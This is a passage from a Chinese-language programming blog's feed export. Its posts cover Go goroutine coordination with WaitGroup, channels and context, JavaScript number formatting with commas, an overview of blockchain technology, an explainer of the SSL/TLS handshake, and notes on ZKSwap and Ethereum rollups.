class="keyword">defer</span> wg.Done() <span class="comment">// finish task1</span></span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 1 done&quot;</span>)</span><br><span class="line">        i++</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wg.Done() <span class="comment">// finish task2</span></span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 2 done&quot;</span>)</span><br><span class="line">        i++</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wg.Done() <span class="comment">// finish task3</span></span><br><span class="line">        fmt.Println(<span class="string">&quot;goroutine 3 done&quot;</span>)</span><br><span class="line">        i++</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait() <span class="comment">// wait for tasks to be done</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;all goroutine done&quot;</span>)</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h2><p>另外一种实际的案例就是，我们需要主动通知一个 Goroutine 进行停止的动作。换句话说，当 App 启动时，会在后台跑一些监控程序，而当整个 App 需要停止前，需要发个 Notification 给后台的监控程序，将其先停止，这时候就需要用到 Channel 来通知。看下下面这个例子：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">func</span> main() &#123;</span><br><span class="line">    <span class="keyword">exit</span> := make(chan bool)</span><br><span class="line">    go <span class="keyword">func</span>() &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            select &#123;</span><br><span class="line">            case &lt;-<span class="keyword">exit</span>:</span><br><span class="line">                fmt.Println(<span class="string">&quot;Exit&quot;</span>)</span><br><span class="line">                return</span><br><span class="line">            case &lt;-time.After(<span class="number">2</span> * time.Second):</span><br><span class="line">                fmt.Println(<span class="string">&quot;Monitoring&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Notify Exit&quot;</span>)</span><br><span class="line">    <span class="keyword">exit</span> &lt;- true <span class="regexp">//</span>keep main goroutine alive</span><br><span class="line">    time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的例子可以发现，用了一个 Gogourtine 和 Channel 来控制。可以想像当后台有无数个 Goroutine 的时候，我们就需要用多个 Channel 才能进行控制，也许 Goroutine 内又会产生 Goroutine，开发者这时候就会发现已经无法单纯使用 Channel 来控制多个 Goroutine 了。这时候解决方式会是传递 Context。</p>
<h2 id="Contexts"><a href="#Contexts" class="headerlink" title="Contexts"></a>Contexts</h2><p>大家可以想像，今天有一个后台任务 A，A 任务又产生了 B 任务，B 任务又产生了 C 任务，也就是可以按照此模式一直产生下去，假设中途我们需要停止 A 任务，而 A 又必须告诉 B 及 C 要一起停止，这时候通过 context 方式是最快的了。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    &quot;context&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func foo(ctx context.Context, <span class="type">name</span> string) &#123;</span><br><span class="line">    go bar(ctx, <span class="type">name</span>) // A calls B</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            fmt.Println(<span class="type">name</span>, &quot;A Exit&quot;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-<span class="type">time</span>.<span class="keyword">After</span>(<span class="number">1</span> * <span class="type">time</span>.Second):</span><br><span class="line">            fmt.Println(<span class="type">name</span>, &quot;A do something&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func bar(ctx context.Context, <span class="type">name</span> string) &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            fmt.Println(<span class="type">name</span>, &quot;B Exit&quot;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-<span class="type">time</span>.<span class="keyword">After</span>(<span class="number">2</span> * <span class="type">time</span>.Second):</span><br><span class="line">            fmt.Println(<span class="type">name</span>, &quot;B do something&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line">    go foo(ctx, &quot;FooBar&quot;)</span><br><span class="line">    fmt.Println(&quot;client release connection, need to notify A, B exit&quot;)</span><br><span class="line">    <span class="type">time</span>.Sleep(<span class="number">5</span> * <span class="type">time</span>.Second)</span><br><span class="line">    cancel() //mock client <span class="keyword">exit</span>, <span class="keyword">and</span> pass the signal, ctx.Done() gets the signal  <span class="type">time</span>.Sleep(<span class="number">3</span> * <span class="type">time</span>.Second)</span><br><span class="line">    <span class="type">time</span>.Sleep(<span class="number">3</span> * <span class="type">time</span>.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大家可以把 context 想成是一个 controller，可以随时控制不确定个数的 Goroutine，由上往下，只要宣告context.WithCancel后，再任意时间点都可以通过cancel()来停止整个后台服务。实际案例会用在当 App 需要重新启动时，要先通知全部 goroutine 停止，正常停止后，才会重新启动 App。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据不同的情境跟状况来选择不同的方式，做一个总结：</p>
<p>WaitGroup：需要将单一个工作分解成多个子任务，等到全部完成后，才能进行下一步，这时候用 WaitGroup 最适合了</p>
<p>Channel + Select：Channel 只能用在比较单纯的 Goroutine 情况下，如果要管理多个 Goroutine，建议还是 走 context 会比较适合</p>
<p>Context：如果您想一次控制全部的 Goroutine，相信用 context 会是最适合不过的。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Channels</tag>
        <tag>WaitGroups</tag>
        <tag>Contexts</tag>
      </tags>
  </entry>
  <entry>
    <title>JS 实现给数字加三位一逗号间隔的两种方法</title>
    <url>/2021/03/javascript-comma/</url>
    <content><![CDATA[<h2 id="JS-实现给数字加三位一逗号间隔的两种方法"><a href="#JS-实现给数字加三位一逗号间隔的两种方法" class="headerlink" title="JS 实现给数字加三位一逗号间隔的两种方法"></a>JS 实现给数字加三位一逗号间隔的两种方法</h2><p>方法一：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">type</span>= <span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span>   num_s = <span class="string">&quot;1232134456.546&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(num_s).<span class="title function_">toLocaleString</span>());</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>方法二：<br> <figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">format_number</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> b=parseInt(n).toString();</span><br><span class="line">    <span class="keyword">var</span> len=b.<span class="built_in">length</span>;</span><br><span class="line">    <span class="keyword">if</span>(len&lt;=<span class="number">3</span>)&#123;<span class="keyword">return</span> b;&#125;</span><br><span class="line">    <span class="keyword">var</span> r=len%<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> r&gt;<span class="number">0</span>?b.<span class="built_in">slice</span>(<span class="number">0</span>,r)+<span class="string">&quot;,&quot;</span>+b.<span class="built_in">slice</span>(r,len).match(<span class="regexp">/\d&#123;3&#125;/g</span>).join(<span class="string">&quot;,&quot;</span>):b.<span class="built_in">slice</span>(r,len).match(<span class="regexp">/\d&#123;3&#125;/g</span>).join(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&quot;53669988.000&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(format_number(a));</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(format_number(<span class="string">&quot;wahh&quot;</span>));</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(format_number(<span class="number">0</span>));</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(format_number(<span class="number">6698.0023</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
  </entry>
  <entry>
    <title>区块链有技术吗？</title>
    <url>/2021/04/blockchain-technology/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>区块链当然有技术，而且区块链是个复杂的交叉学科。先不谈，区块链的人文，社会，经济方面的技术，我不太专业。就纯粹从计算机技术来看，区块链的技术也非常的庞杂和专业。</p>
<span id="more"></span>

<p>先从编程语言开始。2018年，go语言在区块链流行，几乎大点的公链都是用go进行开发，确实简洁好用，网络处理，命令行处理，都有非常丰富的库。2019年，rust语言慢慢流行起来。Facebook的libra项目全部采用rust语言开发。零知识证明的一些库也是由rust语言开发。Rust语言类型预先定义，避免安全隐患；数组定长，防止溢出攻击。Rust语言有个新的概念，所有权（Ownership）的内存管理方式。内存的所有权管理方式，能让编译器在编译的时候检查。所有权是管理堆上数据。通过所有权的设计，Rust在编译的时候，能检查和避免 数据竞争情况（多个地址访问同一数据，数据写入的时候必须有效等等）。区块链开发，经常在多种开发语言之间切换：go，rust，C++，python。有的时候，代码开发有点恍惚：变量类型的定义在变量的前面还是后面？表达式后面需不需要分号？表达式后面是否要加冒号？</p>
<p>数据结构，区块链中有两个比较重要的数据结构：Merkle树和DAG结构。Merkle树，通过叶子节点两两计算hash结果，生成上一层的节点，直至树根。Merkle树数据结构，有很明显的好处，叶子节点的任何改动，都会改动树根。Merkle树还有个优点，在给定某个Merkle path，能证明某个叶子节点确实在以某个树根的merkle树上。Merkle树，也有很多变种。以太坊管理账户信息（世界状态），使用的是MPT树。MPT树通过增加或者合并节点，优化了Merkle树的深度。Merkle树一般是两叉树，其实还可以扩展为多叉树。</p>
<p>DAG，有向无环图。传统的区块链（比如，比特币，以太坊），使用的单序的区块链接方式，也就是后一个区块依赖前一个区块。这种传统的区块链组织方式，限制了交易的性能（TPS）。为了提高TPS，DAG是一种新的区块组织的方式。如何在DAG的区块结构方式下，确定区块&#x2F;交易的顺序，有很多相关的研究和算法。</p>
<p>虚拟机和智能合约，虚拟机是在区块链上安全执行“程序”的环境。智能合约，就是在虚拟机中执行的程序。不同的公链提供了不同类型的虚拟机，比如以太坊的EVM，星云链的JVM，EOS的基于WASM的虚拟机等等。不同的虚拟机有不同的编程规范。</p>
<p>共识算法，共识算法让数据在一定的网络环境下达成共识。最传统的是BFT&#x2F;PBFT共识算法，基于投票以及少数服从多数的原则，只要超过2&#x2F;3的节点签名的数据就是达成共识的数据。PBFT共识算法，需要有几个阶段，每个阶段都需要收集超过2&#x2F;3的节点签名。这种方式，安全可靠，不会有区块分叉，但是效率比较低。PBFT共识算法的复杂度是O（N^2）。为了提高共识算法的性能，提出了其他很多基于BFT思想的共识算法，比如HoneyBadgerBFT算法，LBFT算法。Algorand也是PBFT算法中的一种变种，先随机抽取节点，然后让这些抽取的节点用PBFT算法形成共识。POS&#x2F;DPOS共识算法，采用和PBFT算法完全不一样的共识原理。POS&#x2F;DPOS共识算法，采用谁抵押多，谁出块概率高的思想，简单粗暴。抵押越多，贡献越大，也有相应的出块奖励。</p>
<p>加密算法，区块链中的加密算法比较多。椭圆曲线加密，各种签名算法（BLS，盲签，环签等等）。</p>
<p>零知识证明，零知识证明的理论基础就更多了：椭圆曲线，大数计算，群论，同态加密，配对函数，零知识证明的各种算法（zkSNARK，zkSTARK，BulletProof等等）。零知识证明的理论可以追溯到1985年。目前有两个方向的应用：隐私和数据压缩。Zcash就是利用零知识证明实现交易隐私，交易的双方信息以及交易金额只有交易双方可知。Loopring的去中心化交易协议3.0，就是利用零知识证明实现了链下计算，链上验证的思想。Filecoin利用零知识证明实现”数据的压缩“，用户存储的数据（数据量很大）不需要直接上链，只需要将数据证明（数据量比较小，几百个字节）存储在链上。在零知识证明技术之前，区块链世界是区块链世界，现实世界是现实世界。零知识证明的技术，提供了一种方式，将现实世界，部分映射到了区块链世界。</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
  </entry>
  <entry>
    <title>SSL/TLS 协议运行机制的概述</title>
    <url>/2021/04/network-ssl-tls/</url>
    <content><![CDATA[<h2 id="互联网的通信安全，建立在SSL-TLS协议之上。"><a href="#互联网的通信安全，建立在SSL-TLS协议之上。" class="headerlink" title="互联网的通信安全，建立在SSL&#x2F;TLS协议之上。"></a>互联网的通信安全，建立在SSL&#x2F;TLS协议之上。</h2><p>本文简要介绍SSL&#x2F;TLS协议的运行机制。文章的重点是设计思想和运行过程，不涉及具体的实现细节。如果想了解这方面的内容，请参阅<span class="exturl" data-url="aHR0cDovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTI0Ng==">RFC文档<i class="fa fa-external-link-alt"></i></span>。</p>
<span id="more"></span>

<h2 id="一、作用"><a href="#一、作用" class="headerlink" title="一、作用"></a>一、作用</h2><p>不使用SSL&#x2F;TLS的HTTP通信，就是不加密的通信。所有信息明文传播，带来了三大风险。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">（1） 窃听风险（eavesdropping）：第三方可以获知通信内容。</span><br><span class="line"></span><br><span class="line">（2） 篡改风险（tampering）：第三方可以修改通信内容。</span><br><span class="line"></span><br><span class="line">（3） 冒充风险（pretending）：第三方可以冒充他人身份参与通信。</span><br></pre></td></tr></table></figure>
<p>SSL&#x2F;TLS协议是为了解决这三大风险而设计的，希望达到：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">（1） 所有信息都是加密传播，第三方无法窃听。</span><br><span class="line"></span><br><span class="line">（2） 具有校验机制，一旦被篡改，通信双方会立刻发现。</span><br><span class="line"></span><br><span class="line">（3） 配备身份证书，防止身份被冒充。</span><br></pre></td></tr></table></figure>
<p>互联网是开放环境，通信双方都是未知身份，这为协议的设计带来了很大的难度。而且，协议还必须能够经受所有匪夷所思的攻击，这使得SSL&#x2F;TLS协议变得异常复杂。</p>
<h2 id="二、历史"><a href="#二、历史" class="headerlink" title="二、历史"></a>二、历史</h2><p>互联网加密通信协议的历史，几乎与互联网一样长。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1994</span>年，NetScape公司设计了SSL协议（Secure Sockets Layer）的<span class="number">1</span>.<span class="number">0</span>版，但是未发布。</span><br><span class="line"></span><br><span class="line"><span class="attribute">1995</span>年，NetScape公司发布SSL <span class="number">2</span>.<span class="number">0</span>版，很快发现有严重漏洞。</span><br><span class="line"></span><br><span class="line"><span class="attribute">1996</span>年，SSL <span class="number">3</span>.<span class="number">0</span>版问世，得到大规模应用。</span><br><span class="line"></span><br><span class="line"><span class="attribute">1999</span>年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS <span class="number">1</span>.<span class="number">0</span>版。</span><br><span class="line"></span><br><span class="line"><span class="attribute">2006</span>年和<span class="number">2008</span>年，TLS进行了两次升级，分别为TLS <span class="number">1</span>.<span class="number">1</span>版和TLS <span class="number">1</span>.<span class="number">2</span>版。最新的变动是<span class="number">2011</span>年TLS <span class="number">1</span>.<span class="number">2</span>的修订版。</span><br></pre></td></tr></table></figure>
<p>目前，应用最广泛的是TLS 1.0，接下来是SSL 3.0。但是，主流浏览器都已经实现了TLS 1.2的支持。</p>
<p>TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。</p>
<h2 id="三、基本的运行过程"><a href="#三、基本的运行过程" class="headerlink" title="三、基本的运行过程"></a>三、基本的运行过程</h2><p>SSL&#x2F;TLS协议的基本思路是采用公钥加密法，也就是说，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
<p>但是，这里有两个问题。</p>
<p>（1）如何保证公钥不被篡改？</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">解决方法：将公钥放在数字证书中。只要证书是可信的，公钥就是可信的。</span><br></pre></td></tr></table></figure>
<p>（2）公钥加密计算量太大，如何减少耗用的时间？</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">解决方法：每一次对话（<span class="keyword">session</span>），客户端和服务器端都生成一个&quot;对话密钥&quot;（<span class="keyword">session</span> key），用它来加密信息。由于&quot;对话密钥&quot;是对称加密，所以运算速度非常快，而服务器公钥只用于加密&quot;对话密钥&quot;本身，这样就减少了加密运算的消耗时间。</span><br></pre></td></tr></table></figure>
<p>因此，SSL&#x2F;TLS协议的基本过程是这样的：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>） 客户端向服务器端索要并验证公钥。</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>） 双方协商生成<span class="string">&quot;对话密钥&quot;</span>。</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>） 双方采用<span class="string">&quot;对话密钥&quot;</span>进行加密通信。</span><br></pre></td></tr></table></figure>
<p>上面过程的前两步，又称为”握手阶段”（handshake）。</p>
<h2 id="四、握手阶段的详细过程"><a href="#四、握手阶段的详细过程" class="headerlink" title="四、握手阶段的详细过程"></a>四、握手阶段的详细过程</h2><p>“握手阶段”涉及四次通信，我们一个个来看。需要注意的是，”握手阶段”的所有通信都是明文的。</p>
<p>4.1 客户端发出请求（ClientHello）</p>
<p>首先，客户端（通常是浏览器）先向服务器发出加密通信的请求，这被叫做ClientHello请求。</p>
<p>在这一步，客户端主要向服务器提供以下信息。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>） 支持的协议版本，比如TLS <span class="number">1.0</span>版。</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>） 一个客户端生成的随机数，稍后用于生成<span class="string">&quot;对话密钥&quot;</span>。</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>） 支持的加密方法，比如RSA公钥加密。</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>） 支持的压缩方法。</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，客户端发送的信息之中不包括服务器的域名。也就是说，理论上服务器只能包含一个网站，否则会分不清应该向客户端提供哪一个网站的数字证书。这就是为什么通常一台服务器只能有一张数字证书的原因。</p>
<p>对于虚拟主机的用户来说，这当然很不方便。2006年，TLS协议加入了一个Server Name Indication扩展，允许客户端向服务器提供它所请求的域名。</p>
<p>4.2 服务器回应（SeverHello）</p>
<p>服务器收到客户端请求后，向客户端发出回应，这叫做SeverHello。服务器的回应包含以下内容。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>） 确认使用的加密通信协议版本，比如TLS <span class="number">1.0</span>版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>） 一个服务器生成的随机数，稍后用于生成<span class="string">&quot;对话密钥&quot;</span>。</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>） 确认使用的加密方法，比如RSA公钥加密。</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>） 服务器证书。</span><br></pre></td></tr></table></figure>
<p>除了上面这些信息，如果服务器需要确认客户端的身份，就会再包含一项请求，要求客户端提供”客户端证书”。比如，金融机构往往只允许认证客户连入自己的网络，就会向正式客户提供USB密钥，里面就包含了一张客户端证书。</p>
<p>4.3 客户端回应</p>
<p>客户端收到服务器回应以后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。</p>
<p>如果证书没有问题，客户端就会从证书中取出服务器的公钥。然后，向服务器发送下面三项信息。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>） 一个随机数。该随机数用服务器公钥加密，防止被窃听。</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>） 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>） 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的<span class="built_in">hash</span>值，用来供服务器校验。</span><br></pre></td></tr></table></figure>
<p>上面第一项的随机数，是整个握手阶段出现的第三个随机数，又称”pre-master key”。有了它以后，客户端和服务器就同时有了三个随机数，接着双方就用事先商定的加密方法，各自生成本次会话所用的同一把”会话密钥”。</p>
<p>至于为什么一定要用三个随机数，来生成”会话密钥”，dog250解释得很好：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。</span></span><br><span class="line"></span><br><span class="line">对于RSA密钥交换算法来说，<span class="keyword">pre</span>-master-key本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。</span><br><span class="line"></span><br><span class="line"><span class="keyword">pre</span> master的存在在于SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么<span class="keyword">pre</span> master secret就有可能被猜出来，那么仅适用<span class="keyword">pre</span> master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上<span class="keyword">pre</span> master secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。<span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>
<p>此外，如果前一步，服务器要求客户端证书，客户端会在这一步发送证书及相关信息。</p>
<p>4.4 服务器的最后回应</p>
<p>服务器收到客户端的第三个随机数pre-master key之后，计算生成本次会话所用的”会话密钥”。然后，向客户端最后发送下面信息。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的<span class="built_in">hash</span>值，用来供客户端校验。</span><br></pre></td></tr></table></figure>
<p>至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用”会话密钥”加密内容。</p>
<h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><ul>
<li>MicroSoft TechNet, <span class="exturl" data-url="aHR0cDovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNzg1ODExKHY9d3MuMTApLmFzcHg=">SSL&#x2F;TLS in Detail<i class="fa fa-external-link-alt"></i></span></li>
<li>Jeff Moser, <span class="exturl" data-url="aHR0cDovL3d3dy5tb3NlcndhcmUuY29tLzIwMDkvMDYvZmlyc3QtZmV3LW1pbGxpc2Vjb25kcy1vZi1odHRwcy5odG1s">The First Few Milliseconds of an HTTPS Connection<i class="fa fa-external-link-alt"></i></span></li>
<li>Wikipedia, <span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UcmFuc3BvcnRfTGF5ZXJfU2VjdXJpdHk=">Transport Layer Security<i class="fa fa-external-link-alt"></i></span></li>
<li>StackExchange, <span class="exturl" data-url="aHR0cDovL3NlY3VyaXR5LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8yMDgwMy9ob3ctZG9lcy1zc2wtd29yaw==">How does SSL work?<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>SSL</tag>
        <tag>TLS</tag>
      </tags>
  </entry>
  <entry>
    <title>ZKSwap 探索研究</title>
    <url>/2021/04/zkswap-research/</url>
    <content><![CDATA[<h2 id="ZKSwap-探索研究"><a href="#ZKSwap-探索研究" class="headerlink" title="ZKSwap 探索研究"></a>ZKSwap 探索研究</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhbmh1YmlqaS9hcnRpY2xlL2RldGFpbHMvMTEwNTA4MzM4">ZKSwap blog<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhbmh1YmlqaS9hcnRpY2xlL2RldGFpbHMvMTA0MTA0MTg3">ZKSwap blog<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly96a3Mub3JnL3po">ZKSwap Officeial<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly96a3N3YXAuaW5mby96aA==">ZKSwap info<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9hbHBoYS56a3N3YXAuaW5mby96aA==">ZKSwap alpha info<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly96a3MuYXBwL3po">ZKSwap app<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS56a3Mub3JnLw==">ZKSwap forum<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpLnprcy5vcmcv">ZKSwap wiki<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BoZXJybWl0">Alex Gluchowski<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<span id="more"></span>

<h2 id="ZK-Rollup和Optimistic-Rollup-以太坊重要的扩展方向"><a href="#ZK-Rollup和Optimistic-Rollup-以太坊重要的扩展方向" class="headerlink" title="ZK Rollup和Optimistic Rollup - 以太坊重要的扩展方向"></a>ZK Rollup和Optimistic Rollup - 以太坊重要的扩展方向</h2><p>前言：多年来，扩展性一直困扰着公链。关于扩展性的解决方案有的在概念论证中，有的在研发中。Optimistic Rollup和Zk Rollup也是扩展性的解决方案，并引起了加密社区的浓厚兴趣。那么，到底什么Optimistic Rollup和ZK Rollup？哪一种技术路线会赢得以太坊扩展的未来？不管道路如何曲折，之前的努力是否有用（如plasma等技术解决方案），但以太坊的扩展之路一直在前进，满足主流场景并非遥不可及。本文作者Alex Gluchowski，由蓝狐笔记社群的“JOKO”翻译。</p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Optimistic Rollup是一种很有希望在短期内扩展以太坊上通用智能合约的技术。如果构建足够快，它能够提供可以轻松迁移现有dApp和服务的方法，且能合理权衡安全和可扩展性。这将使得ETH1.0能够满足不断增长的需求。</p>
<p>ZK Rollup是一种更加复杂的技术。它如今可以用于代币转移和特定应用。然而，要在通用智能合约上实现还需要更长一些时间，并且要想高效地将EVM包裹于ZKP中甚至还需要更多的研究工作。（蓝狐笔记：ZKP是指零知识证明）</p>
<p>不过，一旦ZK Rollup完全开发出来，所有现有的以太坊dApp和服务都能够平滑且轻松地迁移过去。</p>
<p>ZK Rollup将会解决Optimistic Rollup上的几个基本问题：</p>
<pre><code>消除让人讨厌的尾巴风险：通过复杂但可行的攻击向量盗取资金；

将提取资金时间从1-2周减少至几分钟；

支持快速交易确认并以无限制的数量退出；

默认引入隐私。
</code></pre>
<p>Optimistic Rollup对ZK Rollup来说是个好消息。向Layer 2扩展的过渡要求对钱包、预言机、dApp、用户习惯的重大改变。Optimistic Rollup有助于为这一行动做好生态系统的准备，将扩展性带入这些尚不能基于ZK Rollup构建的dApp。这给予ZK Rollup足够的时间发展成熟，并使其实现完全无缝的采用，与此同时维持以太坊的增长势头。</p>
<h4 id="Rollup-101"><a href="#Rollup-101" class="headerlink" title="Rollup 101"></a>Rollup 101</h4><ul>
<li>什么是Rollup？</li>
</ul>
<p>Rollup是类似于Plasma的Layer-2扩展性解决方案：单个主链合约持有所有资金，并对较大的“侧链”状态（通常是账户、余额及其状态的Merkle树）进行简洁的加密承诺。侧链状态由用户和运营商链下维持，且不依赖于Layer 1的存储（这是最大的扩展性胜利的源头）。</p>
<p>将Rollup和Plasma区分开来的是它解决了Plasms的巨大问题：数据可用性，其方式是通过Layer 1网络为每笔交易发布一些数据（在以太坊，专门为此目的使用tx CALLDATA）。</p>
